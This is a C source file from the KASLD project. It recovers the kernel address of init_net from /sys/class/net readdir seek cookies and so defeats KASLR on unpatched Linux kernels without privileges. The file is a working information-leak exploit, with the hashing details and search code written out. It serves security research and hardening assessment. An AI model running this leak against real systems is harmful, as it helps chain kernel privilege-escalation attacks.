// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Recover a KASLR-linked kernel address (&init_net) from the directory seek
// positions of a namespace-tagged sysfs directory.
//
// kernfs hashes each entry's name together with its namespace tag and exposes
// that hash to userspace as the entry's readdir seek cookie (d_off):
//
//     kn->hash = kernfs_name_hash(name, ns);   // fs/kernfs/dir.c
//     ...
//     ctx->pos = pos->hash;                     // handed out as d_off
//
// and kernfs_name_hash() seeds the fold with the namespace tag itself:
//
//     unsigned long hash = init_name_hash(ns);  // == (unsigned long)ns
//     while (len--) hash = partial_name_hash(*name++, hash);
//     hash = end_name_hash(hash) & 0x7fffffff;  // 31-bit, reserves 0/1/INT_MAX
//
// For a reader in the initial network namespace the tag of every /sys/class/net
// entry is &init_net — a kernel-image (BSS) global that moves with KASLR. Each
// interface name is known to the reader (readdir returns it) and the fold is
// affine in the salt: chain(S,name) = S*11^len + chain(0,name). Given two or
// more (name, cookie) pairs that share the one salt, the salt is recovered by
// testing each candidate kernel base — a wrong salt cannot reproduce every
// observed cookie. The recovered salt is &init_net; subtracting this build's
// init_net-from-_text offset yields the image base.
//
// The value reaches userspace as an off_t seek cookie, NOT through the %p
// pointer-hashing path, so it is independent of kptr_restrict. No capability,
// group, or sysctl gates a readdir of /sys/class/net.
//
//   Data leaked:      &init_net (kernel-image BSS global, KASLR-linked)
//   Kernel subsystem: fs/kernfs — readdir seek position (dir.c)
//   Address type:     virtual (kernel image)
//   Method:           parsed (recovered from getdents64 d_off cookies)
//   Privilege:        unprivileged — any process in the initial netns reading
//                     /sys/class/net. kptr_restrict-INDEPENDENT (a d_off value,
//                     not %p).
//   Patch:            namespace id used as the salt instead of the pointer
//                     (v7.0, commit 1fe989e1c42a). Present since 2.6.12
//                     (Fixes: 1da177e4c3f4) — live on every pre-v7.0 kernel,
//                     i.e. all current LTS lines.
//
// The leak was identified and fixed by Christian Brauner <brauner@kernel.org>
// in commit 1fe989e1c42a ("kernfs: use namespace id instead of pointer for
// hashing and comparison"), which labels it a KASLR information leak.
//
// After the fix the salt is a small non-secret ns_id integer, so no kernel
// base reproduces the observed cookies and the component emits nothing — a
// silent no-op, sound by construction. It also emits nothing unless the
// harvested cookies determine a UNIQUE kernel-VA salt (>=2 known names in the
// searched window), so a coincidental single-name match cannot narrow anything.
//
// Engine fit: &init_net is emitted as a REGION_KERNEL_IMAGE interior sample,
// which bounds Q_VIRT_IMAGE_BASE from above (image_base <= &init_net). When the
// per-build offset table recognises the running kernel, image_base =
// &init_net - off is also emitted as a graded base pin (the offset table is
// keyed on the full uname fingerprint, as in bpf_verifier_ksym.c).
//
// Arch scope and the reason for it: the leak mechanism is
// architecture-independent, but RECOVERY is a search. The exposed cookie is a
// name hash folded with end_name_hash (a multiply-high), which is not cheaply
// invertible, so &init_net is found only by testing candidate kernel bases. To
// stay sound the search must cover the WHOLE KASLR-admissible window —
// narrowing it could step over the true base — so the cost is fixed by that
// window: it is (KASLR range / KASLR_VIRT_ALIGN) candidates, and cannot be
// reduced. An arch is supportable only when that count is small enough to test
// in about a second (KERNFS_MAX_SLOTS); where it is not, the probe is skipped
// rather than run for minutes or narrowed unsoundly. The fold also selects
// hash_32 or hash_64 by the target word size, so 32- and 64-bit kernels are
// both modelled correctly.
//   supported: x86_64 (~2^9), riscv64 (~2^9), arm/i386/riscv32 (~2^7-2^10),
//              mips/mips64/loongarch64 (~2^14-2^16), aarch64 (~2^30, offset
//              table required — its tableless, word-step window is
//              intractable);
//   excluded:  s390x (~2^38) and powerpc64/powerpc64le (~2^47): their KASLR
//              windows hold billions of admissible bases — far past the cap.
// An excluded arch recovers no salt and emits nothing — a no-op, never a false
// pin, exactly as on a patched kernel or outside the initial netns. The offset
// table carries rows for the supported arches; where a build is absent from it
// the base pin is skipped and only the guaranteed interior sample (from a
// recovered salt) is emitted, on any arch whose tableless window fits the cap.
//
// 32-bit alias caveat: kernfs masks the cookie to 31 bits (& 0x7fffffff). On a
// 32-bit kernel end_name_hash is hash_32 (no final shift), so the mask erases
// exactly the salt-bit that maps to cookie bit 31 — &init_net and &init_net ±
// 2^31 yield identical cookies. When both aliases fall inside the KASLR window
// (32-bit arches whose window spans 2^31, i.e. x86/arm/ppc32 at a high base
// such as a 3G/1G split) the recovery is genuinely ambiguous and emits NOTHING
// — a sound no-op, never a wrong base. It recovers uniquely where the alias
// cannot coexist in the window: every 64-bit arch (hash_64 shifts by 32, so
// there is no clean ±2^31 salt alias), the narrow-window 32-bit arches (mips,
// riscv32), and 32-bit builds whose alias lands below the window floor (typical
// arm). The bit is unrecoverable from the cookie alone and cannot be pinned
// down without a separate VMSPLIT/PAGE_OFFSET determination, so it is left
// ambiguous.
//
// Mitigations:
//   Patched by salting with the namespace id (v7.0). Otherwise the only barrier
//   is running the reader outside the initial network namespace: in another
//   netns the tag is that netns's own `struct net` (a direct-map pointer),
//   which this component does not attribute to the image base.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/hash.h"

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

/* end_name_hash uses hash_long(), which is hash_64() on a 64-bit kernel and
 * hash_32() on a 32-bit one — different golden-ratio constant and final shift.
 * Selecting by KASLD's own word size is correct because the probe binary is
 * built for (and run against) a kernel of the same width. */
#if __SIZEOF_LONG__ == 8
#define KERNFS_GR 0x61C8864680B583EBUL /* GOLDEN_RATIO_64 */
#define KERNFS_HSHIFT 32               /* hash_64(v,32): >> (64 - 32) */
#else
#define KERNFS_GR 0x61C88647UL /* GOLDEN_RATIO_32 */
#define KERNFS_HSHIFT 0        /* hash_32(v,32): >> (32 - 32) */
#endif
/* INT_MAX seek sentinel emitted after the last real entry (dir.c). */
#define KERNFS_POS_END 0x7fffffffU
/* Upper bound on (name, cookie) pairs harvested from one directory. */
#define KERNFS_MAX_PAIRS 64
/* Cap on the recovery search so it stays a sub-second-to-~1 s probe on every
 * arch it runs on, and a no-op where the KASLR grid is intractable. Recovery
 * tests ~8e8 candidates/s, so 2^31 bounds the worst case near a second. With
 * the offset table (step = KASLR_VIRT_ALIGN) this admits every supported arch —
 * x86_64/riscv64 ~2^9, the 32-bit arches ~2^7-2^17, mips64/loongarch
 * ~2^14-2^16, aarch64 ~2^30 — and excludes s390x (~2^38) and ppc64/ppc64le
 * (~2^47), whose sound KASLR windows are far too large. Tableless (step = word)
 * the window is ~2^26-2^29 on the small-range arches and intractable on
 * aarch64, so aarch64 pins only when its build is in the offset table. */
#define KERNFS_MAX_SLOTS (1UL << 31)
/* Net-namespace-tagged sysfs directory read for the salt. */
#define KERNFS_NET_DIR "/sys/class/net"

/* Per-build offset of init_net from _text, keyed on the FNV-1a-64 hash of the
 * running kernel's full uname fingerprint ("<release> <version>") — the same
 * keying and hash as bpf_verifier_ksym.c / qemu_tcg_iret.c. off == 0 marks an
 * absent row. The offset is _text-relative on every arch, so the recovered
 * base is _text directly. Rows are split into per-arch #if blocks (the api.h
 * arch dispatch), so each cross-compiled binary carries only its own arch's
 * table. */
struct kernel_info {
  uint64_t uname_hash;
  uint32_t off; /* init_net - _text; 0 = absent */
};

#ifdef __has_include
#if __has_include("offsets/kernfs_ns_hash.inc")
#include "offsets/kernfs_ns_hash.inc"
#endif
#endif
#ifndef KASLD_OFFSETS_PRESENT
/* Table not yet generated: no rows. The interior sample below still fires; the
 * base pin is simply skipped (base_offset_lookup returns absent). */
static const struct kernel_info offsets[] = {{0, 0}};
#endif
#undef KASLD_OFFSETS_PRESENT

#define KERNFS_ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

/* struct linux_dirent64 field offsets: d_ino(8), d_off(8), d_reclen(2),
 * d_type(1), d_name[]. Fields are read by memcpy from the byte buffer rather
 * than through an aligned struct cast (the buffer is char-aligned). */
#define KERNFS_DIRENT_OFF 8
#define KERNFS_DIRENT_RECLEN 16
#define KERNFS_DIRENT_NAME 19

/* One recovered constraint: chain(S,name) = S*pow11 + cname (in the kernel's
 * word size), observed folded to the 31-bit cookie `hash`. */
struct kernfs_pair {
  unsigned long pow11;
  unsigned long cname;
  uint32_t hash;
};

KASLD_EXPLAIN(
    "Reads /sys/class/net with getdents64 and collects each interface's seek "
    "cookie (d_off). Before commit 1fe989e1c42a, kernfs derived that cookie "
    "from a hash salted with the raw namespace pointer, so for a reader in the "
    "initial netns every cookie folds in &init_net. The name-hash fold is "
    "affine in the salt, so testing each candidate kernel base recovers the "
    "unique &init_net that reproduces all observed cookies. Emits &init_net as "
    "an interior image sample (bounds the base from above) and, when the "
    "offset table recognises the build, the pinned image base. Independent of "
    "kptr_restrict (a d_off value, not %p); a silent no-op on a patched kernel "
    "(the ns-id salt reproduces no kernel base) or outside the initial netns.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "discloses:virtual\n"
           "patch:v7.0\n");

/* end_name_hash (hash_32/hash_64 by word size) + kernfs's 31-bit mask and
 * reserved-value clamps (dir.c). */
static inline uint32_t kernfs_fold(unsigned long acc) {
  uint32_t v = (uint32_t)((acc * KERNFS_GR) >> KERNFS_HSHIFT);
  v &= 0x7fffffffU;
  if (v < 2)
    v += 2;
  if (v >= KERNFS_POS_END)
    v = KERNFS_POS_END - 1;
  return v;
}

/* Precompute the affine constants (11^len, chain(0,name)) for `name`, so that
 * kernfs_name_hash(salt,name) == kernfs_fold(salt*pow11 + cname). Computed in
 * `unsigned long` so the wrap matches the kernel's (32- or 64-bit). */
static void kernfs_affine(const char *name, unsigned long *pow11,
                          unsigned long *cname) {
  unsigned long h = 0, p = 1;
  for (const unsigned char *q = (const unsigned char *)name; *q; q++) {
    unsigned long c = *q;
    h = (h + (c << 4) + (c >> 4)) * 11UL;
    p *= 11UL;
  }
  *pow11 = p;
  *cname = h;
}

/* True iff candidate salt S reproduces every harvested cookie. */
static int kernfs_salt_ok(unsigned long S, const struct kernfs_pair *pr,
                          int n) {
  for (int i = 0; i < n; i++)
    if (kernfs_fold(S * pr[i].pow11 + pr[i].cname) != pr[i].hash)
      return 0;
  return 1;
}

/* Read `dir` and build (name, cookie) constraints. d_off is the NEXT entry's
 * cookie (filldir "prev" mechanism), so entry i's name pairs with entry i-1's
 * d_off; the final entry carries the INT_MAX sentinel, which is skipped. The
 * dot entries are kept only as cookie predecessors (".." carries the first real
 * entry's hash), never as names. Returns the pair count, or -1 on open failure
 * with *err set. */
static int kernfs_harvest(const char *dir, struct kernfs_pair *pr, int max,
                          int *err) {
  int fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
  if (fd < 0) {
    *err = errno;
    return -1;
  }

  char buf[8192];
  /* Ordered (name, d_off) as returned, dots included. */
  char names[KERNFS_MAX_PAIRS + 4][32];
  uint32_t doff[KERNFS_MAX_PAIRS + 4];
  int nent = 0;
  for (;;) {
    long nread = syscall(SYS_getdents64, fd, buf, sizeof(buf));
    if (nread <= 0)
      break;
    for (long o = 0; o < nread && nent < KERNFS_MAX_PAIRS + 4;) {
      int64_t d_off;
      uint16_t d_reclen;
      memcpy(&d_off, buf + o + KERNFS_DIRENT_OFF, sizeof(d_off));
      memcpy(&d_reclen, buf + o + KERNFS_DIRENT_RECLEN, sizeof(d_reclen));
      if (d_reclen == 0)
        break; /* malformed — avoid a non-advancing loop */
      strncpy(names[nent], buf + o + KERNFS_DIRENT_NAME,
              sizeof(names[nent]) - 1);
      names[nent][sizeof(names[nent]) - 1] = '\0';
      doff[nent] = (uint32_t)d_off;
      nent++;
      o += d_reclen;
    }
    if (nent >= KERNFS_MAX_PAIRS + 4)
      break;
  }
  close(fd);

  int n = 0;
  for (int i = 1; i < nent && n < max; i++) {
    if (doff[i - 1] == KERNFS_POS_END) /* sentinel, not a hash */
      continue;
    if (!strcmp(names[i], ".") || !strcmp(names[i], ".."))
      continue;
    kernfs_affine(names[i], &pr[n].pow11, &pr[n].cname);
    pr[n].hash = doff[i - 1];
    n++;
  }
  *err = 0;
  return n;
}

/* This build's init_net-from-_text offset, or 0 if the table does not know the
 * running kernel (or carries no rows for this arch). */
static uint32_t base_offset_lookup(void) {
  if (!offsets[0].uname_hash)
    return 0;
  struct utsname u;
  if (kasld_uname(&u) != 0)
    return 0;
  char fp[512];
  kasld_uname_fingerprint(fp, sizeof fp, &u);
  uint64_t h = kasld_fnv1a64(fp);
  for (unsigned long i = 0; i < KERNFS_ARRAY_SIZE(offsets); i++)
    if (offsets[i].uname_hash == h)
      return offsets[i].off;
  return 0;
}

/* Scan candidate bases b in [lo, hi] step `step`, testing salt = b + off, and
 * return 1 with the UNIQUE matching salt in *salt; 0 if none or ambiguous.
 * A wrong candidate cannot reproduce every cookie, so a lone survivor is the
 * true salt. Split out so the recovery is testable over a bounded window. */
static int kernfs_scan(const struct kernfs_pair *pr, int n, unsigned long lo,
                       unsigned long hi, unsigned long step, uint32_t off,
                       unsigned long *salt) {
  if (step == 0 || hi < lo)
    return 0;
  unsigned long found = 0;
  int matches = 0;
  for (unsigned long b = lo; b <= hi && b >= lo; b += step) {
    unsigned long cand = b + off;
    if (kernfs_salt_ok(cand, pr, n)) {
      if (++matches > 1)
        return 0; /* ambiguous — refuse to narrow */
      found = cand;
    }
    if (b > hi - step) /* last step would wrap */
      break;
  }
  if (matches != 1)
    return 0;
  *salt = found;
  return 1;
}

/* Recover &init_net that uniquely satisfies the harvested cookies.
 *   off != 0: walk the KASLR base grid (step KASLR_VIRT_ALIGN), testing
 *             base + off — the tightest search.
 *   off == 0: walk candidate salts word-aligned across the KASLR text window.
 * Returns 1 and sets *salt on a UNIQUE match; 0 if none, ambiguous, or the
 * window is too large for this arch. */
static int kernfs_recover(const struct kernfs_pair *pr, int n, uint32_t off,
                          unsigned long *salt) {
  unsigned long lo = KASLR_VIRT_TEXT_MIN, hi = KASLR_VIRT_TEXT_MAX;
  unsigned long step = off ? (unsigned long)KASLR_VIRT_ALIGN : sizeof(long);
  if (step == 0 || (hi - lo) / step > KERNFS_MAX_SLOTS)
    return 0; /* window too large for this arch — skip (documented) */
  return kernfs_scan(pr, n, lo, hi, step, off, salt);
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);
  /* Live host probe: reads the running kernel's sysfs; the recovered address is
   * this machine's, not reproducible from a captured tree. */
  if (kasld_skip_live_probe("kernfs_ns_hash"))
    return 0;

  kasld_info("recovering &init_net from " KERNFS_NET_DIR " seek cookies ...");

  struct kernfs_pair pr[KERNFS_MAX_PAIRS];
  int err = 0;
  int n = kernfs_harvest(KERNFS_NET_DIR, pr, KERNFS_MAX_PAIRS, &err);
  if (n < 0) {
    if (err == EACCES || err == EPERM) {
      kasld_err(KERNFS_NET_DIR " access denied");
      return KASLD_EXIT_NOPERM;
    }
    kasld_err(KERNFS_NET_DIR " unavailable (%s)", strerror(err));
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (n < 2) {
    kasld_err("need >=2 named entries in " KERNFS_NET_DIR
              " to determine the salt (have %d)",
              n);
    return KASLD_EXIT_UNAVAILABLE;
  }

  uint32_t off = base_offset_lookup();
  unsigned long initnet = 0;
  if (!kernfs_recover(pr, n, off, &initnet)) {
    kasld_err("no unique kernel-VA salt reproduces the cookies "
              "(patched kernel, non-initial netns, or arch window too large)");
    return 0;
  }

  kasld_found("recovered &init_net = 0x%lx from %d seek cookies", initnet, n);

  /* If the build is known, pin the image base. CONF_HEURISTIC: the offset is
   * trusted from the uname fingerprint (the guaranteed window rests on the
   * interior sample below). base + off reproduced every cookie, so a wrong
   * offset from a uname collision could not have matched. */
  if (off && initnet > off) {
    unsigned long base = initnet - off;
    if (kasld_addr_is_kernel_text(base)) {
      kasld_found("image base pinned via offset table: 0x%lx", base);
      kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                        CONF_HEURISTIC);
    }
  }

  /* &init_net is an interior image address: image_base <= &init_net. Emitted as
   * a guaranteed upper-bound sample regardless of the offset table. */
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, initnet, NULL,
                      CONF_PARSED);
  return 0;
}
